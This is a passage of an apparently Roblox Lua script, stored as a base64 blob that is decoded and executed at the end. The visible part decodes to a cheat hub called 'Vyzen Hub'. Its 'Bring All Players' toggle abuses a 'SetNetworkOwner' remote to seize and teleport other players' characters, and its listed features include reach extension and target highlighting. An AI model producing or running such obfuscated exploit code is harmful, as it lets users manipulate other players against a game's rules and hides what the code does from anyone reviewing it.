mFjdGVyIHRoZW4KICAgICAgICBsb2NhbCByb290ID0gcGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgbG9jYWwgaGVhZCA9IHBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkhlYWQiKQogICAgICAgIGxvY2FsIG15Q2hhciA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgIGxvY2FsIG15Um9vdCA9IG15Q2hhciBhbmQgbXlDaGFyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAKICAgICAgICBpZiByb290IGFuZCBoZWFkIGFuZCBteVJvb3QgdGhlbgogICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBteUNoYXI6UGl2b3RUbyhyb290LkNGcmFtZSAqIENGcmFtZS5uZXcoMCwgLTYsIDApKQogICAgICAgICAgICAgICAgTm9Db2wobXlDaGFyKQogICAgICAgICAgICAgICAgbG9jYWwgYXR0ZW1wdHMgPSAwCiAgICAgICAgICAgICAgICByZXBlYXQKICAgICAgICAgICAgICAgICAgICBTZXROZXR3b3JrT3duZXI6RmlyZVNlcnZlcihyb290LCBteVJvb3QuQ0ZyYW1lKQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjE1KQogICAgICAgICAgICAgICAgICAgIGF0dGVtcHRzID0gYXR0ZW1wdHMgKyAxCiAgICAgICAgICAgICAgICB1bnRpbCBhdHRlbXB0cyA+IDIwIG9yIChoZWFkOkZpbmRGaXJzdENoaWxkKCJQYXJ0T3duZXIiKSBhbmQgaGVhZC5QYXJ0T3duZXIuVmFsdWUgPT0gTG9jYWxQbGF5ZXIuTmFtZSkgb3Igbm90IGJyaW5nQWxsU2V0dGluZ3MuQQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiBicmluZ0FsbFNldHRpbmdzLkEgYW5kIGhlYWQ6RmluZEZpcnN0Q2hpbGQoIlBhcnRPd25lciIpIGFuZCBoZWFkLlBhcnRPd25lci5WYWx1ZSA9PSBMb2NhbFBsYXllci5OYW1lIHRoZW4KICAgICAgICAgICAgICAgICAgICByb290LkNGcmFtZSA9IENGcmFtZS5uZXcoYnJpbmdBbGxTZXR0aW5ncy5Qb3MpCiAgICAgICAgICAgICAgICAgICAgcm9vdC5Qb3NpdGlvbiA9IGJyaW5nQWxsU2V0dGluZ3MuUG9zCiAgICAgICAgICAgICAgICAgICAgcm9vdC5Bc3NlbWJseUxpbmVhclZlbG9jaXR5ID0gVmVjdG9yMy56ZXJvCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuOCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCgpsb2NhbCBmdW5jdGlvbiBTdGFydCgpCiAgICBsb2NhbCBteUNoYXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgIGxvY2FsIG15Um9vdCA9IG15Q2hhciBhbmQgbXlDaGFyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgIAogICAgaWYgbXlSb290IHRoZW4KICAgICAgICBicmluZ0FsbFNldHRpbmdzLlBvcyA9IG15Um9vdC5Qb3NpdGlvbgogICAgICAgIGJyaW5nQWxsU2V0dGluZ3MuQ2FtID0gV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lCiAgICAgICAgUmVRKCkKICAgICAgICBGekNhbSgpCiAgICAgICAgYnJpbmdBbGxTZXR0aW5ncy5Db25uID0gUnVuU2VydmljZS5IZWFydGJlYXQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgIGlmIGJyaW5nQWxsU2V0dGluZ3MuQSB0aGVuCiAgICAgICAgICAgICAgICBOZXh0KCkKICAgICAgICAgICAgICAgIGlmIGJyaW5nQWxsU2V0dGluZ3MuQ2FtIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCBjYW1lcmEgPSBXb3Jrc3BhY2UuQ3VycmVudENhbWVyYQogICAgICAgICAgICAgICAgICAgIGNhbWVyYS5DYW1lcmFUeXBlID0gRW51bS5DYW1lcmFUeXBlLlNjcmlwdGFibGUKICAgICAgICAgICAgICAgICAgICBjYW1lcmEuQ0ZyYW1lID0gYnJpbmdBbGxTZXR0aW5ncy5DYW0KICAgICAgICAgICAgICAgICAgICBicmluZ0FsbFNldHRpbmdzLkNCLkNGcmFtZSA9IGJyaW5nQWxsU2V0dGluZ3MuQ2FtCiAgICAgICAgICAgICAgICAgICAgYnJpbmdBbGxTZXR0aW5ncy5DQi5QYXJlbnQgPSBXb3Jrc3BhY2UKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKZW5kCgpsb2NhbCBmdW5jdGlvbiBTdG9wKCkKICAgIGlmIGJyaW5nQWxsU2V0dGluZ3MuQ29ubiB0aGVuCiAgICAgICAgYnJpbmdBbGxTZXR0aW5ncy5Db25uOkRpc2Nvbm5lY3QoKQogICAgICAgIGJyaW5nQWxsU2V0dGluZ3MuQ29ubiA9IG5pbAogICAgZW5kCiAgICBVbkZ6Q2FtKCkKICAgIGxvY2FsIG15Q2hhciA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgbG9jYWwgbXlSb290ID0gbXlDaGFyIGFuZCBteUNoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgaWYgbXlSb290IGFuZCBicmluZ0FsbFNldHRpbmdzLlBvcyB0aGVuCiAgICAgICAgbXlSb290LkFzc2VtYmx5TGluZWFyVmVsb2NpdHkgPSBWZWN0b3IzLnplcm8KICAgICAgICBteVJvb3QuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyhicmluZ0FsbFNldHRpbmdzLlBvcykKICAgIGVuZAplbmQKCmxvY2FsIGZ1bmN0aW9uIENoYXJBZGQoY2hhcikKICAgIGNoYXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZCIpLkRpZWQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgaWYgYnJpbmdBbGxTZXR0aW5ncy5Db25uIHRoZW4KICAgICAgICAgICAgYnJpbmdBbGxTZXR0aW5ncy5Db25uOkRpc2Nvbm5lY3QoKQogICAgICAgICAgICBicmluZ0FsbFNldHRpbmdzLkNvbm4gPSBuaWwKICAgICAgICBlbmQKICAgICAgICBVbkZ6Q2FtKCkKICAgIGVuZCkKICAgIAogICAgaWYgYnJpbmdBbGxTZXR0aW5ncy5BIHRoZW4KICAgICAgICBsb2NhbCByb290ID0gY2hhcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgIGJyaW5nQWxsU2V0dGluZ3MuUG9zID0gYnJpbmdBbGxTZXR0aW5ncy5Qb3Mgb3Igcm9vdC5Qb3NpdGlvbgogICAgICAgIGJyaW5nQWxsU2V0dGluZ3MuQ2FtID0gYnJpbmdBbGxTZXR0aW5ncy5DYW0gb3IgV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lCiAgICAgICAgRnpDYW0oKQogICAgICAgIGJyaW5nQWxsU2V0dGluZ3MuQ29ubiA9IFJ1blNlcnZpY2UuSGVhcnRiZWF0OkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICBpZiBicmluZ0FsbFNldHRpbmdzLkEgdGhlbgogICAgICAgICAgICAgICAgTmV4dCgpCiAgICAgICAgICAgICAgICBpZiBicmluZ0FsbFNldHRpbmdzLkNhbSB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgY2FtZXJhID0gV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEKICAgICAgICAgICAgICAgICAgICBjYW1lcmEuQ2FtZXJhVHlwZSA9IEVudW0uQ2FtZXJhVHlwZS5TY3JpcHRhYmxlCiAgICAgICAgICAgICAgICAgICAgY2FtZXJhLkNGcmFtZSA9IGJyaW5nQWxsU2V0dGluZ3MuQ2FtCiAgICAgICAgICAgICAgICAgICAgYnJpbmdBbGxTZXR0aW5ncy5DQi5DRnJhbWUgPSBicmluZ0FsbFNldHRpbmdzLkNhbQogICAgICAgICAgICAgICAgICAgIGJyaW5nQWxsU2V0dGluZ3MuQ0IuUGFyZW50ID0gV29ya3NwYWNlCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZW5kCmVuZAoKTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6Q29ubmVjdChDaGFyQWRkKQoKUGxheWVycy5QbGF5ZXJBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgIGlmIGJyaW5nQWxsU2V0dGluZ3MuQSB0aGVuCiAgICAgICAgUmVRKCkKICAgIGVuZAplbmQpCgpQbGF5ZXJzLlBsYXllclJlbW92aW5nOkNvbm5lY3QoZnVuY3Rpb24ocGxheWVyKQogICAgZm9yIGkgPSAjYnJpbmdBbGxTZXR0aW5ncy5RLCAxLCAtMSBkbwogICAgICAgIGlmIGJyaW5nQWxsU2V0dGluZ3MuUVtpXSA9PSBwbGF5ZXIgdGhlbgogICAgICAgICAgICB0YWJsZS5yZW1vdmUoYnJpbmdBbGxTZXR0aW5ncy5RLCBpKQogICAgICAgIGVuZAogICAgZW5kCmVuZCkKClJhbmRvbVRhYjpDcmVhdGVUb2dnbGUoewogICAgTmFtZSA9ICJCcmluZyBBbGwgUGxheWVycyIsCiAgICBDdXJyZW50VmFsdWUgPSBmYWxzZSwKICAgIEZsYWcgPSAiQnJpbmdBbGwiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihWYWx1ZSkKICAgICAgICBicmluZ0FsbFNldHRpbmdzLkEgPSBWYWx1ZQogICAgICAgIGlmIFZhbHVlIHRoZW4KICAgICAgICAgICAgU3RhcnQoKQogICAgICAgIGVsc2UKICAgICAgICAgICAgU3RvcCgpCiAgICAgICAgZW5kCiAgICBlbmQKfSkKClJhbmRvbVRhYjpDcmVhdGVUb2dnbGUoewogICAgTmFtZSA9ICJXaGl0ZWxpc3QgRnJpZW5kcyIsCiAgICBDdXJyZW50VmFsdWUgPSBmYWxzZSwKICAgIEZsYWcgPSAiV2hpdGVsaXN0RnJpZW5kcyIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKFZhbHVlKQogICAgICAgIGJyaW5nQWxsU2V0dGluZ3MuV0wgPSBWYWx1ZQogICAgZW5kCn0pCgpsb2NhbCBDcmVkaXRzU2VjdGlvbiA9IENyZWRpdHNUYWI6Q3JlYXRlU2VjdGlvbigiQ3JlZGl0cyIpCgpDcmVkaXRzVGFiOkNyZWF0ZUxhYmVsKCJWeXplbiBIdWIgLSBGSVhFRCBWRVJTSU9OIikKQ3JlZGl0c1RhYjpDcmVhdGVMYWJlbCgiVmVyc2lvbiAyLjAgLSBBbGwgQnVncyBGaXhlZCIpCkNyZWRpdHNUYWI6Q3JlYXRlTGFiZWwoIk1hZGUgYnkgVnl6ZW4iKQpDcmVkaXRzVGFiOkNyZWF0ZUxhYmVsKCIiKQpDcmVkaXRzVGFiOkNyZWF0ZUxhYmVsKCLinIUgRGVhdGggaGFuZGxpbmcgZml4ZWQiKQpDcmVkaXRzVGFiOkNyZWF0ZUxhYmVsKCLinIUgRk9WIGFjdHVhbGx5IHdvcmtzIikKQ3JlZGl0c1RhYjpDcmVhdGVMYWJlbCgi4pyFIEJldHRlciByZWFjaCAoMTAtMTAwIHN0dWRzKSIpCkNyZWRpdHNUYWI6Q3JlYXRlTGFiZWwoIuKchSBGT1YgdmlzdWFsaXplciBhZGRlZCIpCkNyZWRpdHNUYWI6Q3JlYXRlTGFiZWwoIuKchSBUYXJnZXQgaGlnaGxpZ2h0aW5nIGFkZGVkIikKClJheWZpZWxkOkxvYWRDb25maWd1cmF0aW9uKCkKCnByaW50KCLilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIEiKQpwcmludCgi4pyFIFZZWkVOIEhVQiAtIEZJWEVEIFZFUlNJT04gTE9BREVEIikKcHJpbnQoIuKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgSIpCnByaW50KCLinIUgQ2hhcmFjdGVyIGRlYXRoIGhhbmRsaW5nIC0gRklYRUQiKQpwcmludCgi4pyFIEFsaXZlIGNoZWNrcyBpbiBhdHRhY2tzIC0gRklYRUQiKQpwcmludCgi4pyFIExvb3AgY29ubmVjdGlvbiBjbGVhbnVwIC0gRklYRUQiKQpwcmludCgi4pyFIEF1dG8tcmVzdGFydCBhZnRlciByZXNwYXduIC0gRklYRUQiKQpwcmludCgi4pyFIEZPViBhY3R1YWxseSB3b3JrcyAtIEZJWEVEIikKcHJpbnQoIuKchSBCZXR0ZXIgcmVhY2ggKDEwLTEwMCBzdHVkcykgLSBBRERFRCIpCnByaW50KCLinIUgRk9WIGNpcmNsZSB2aXN1YWxpemVyIC0gQURERUQiKQpwcmludCgi4pyFIFRhcmdldCBoaWdobGlnaHRpbmcgLSBBRERFRCIpCnByaW50KCLilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIEiKQ=='))()
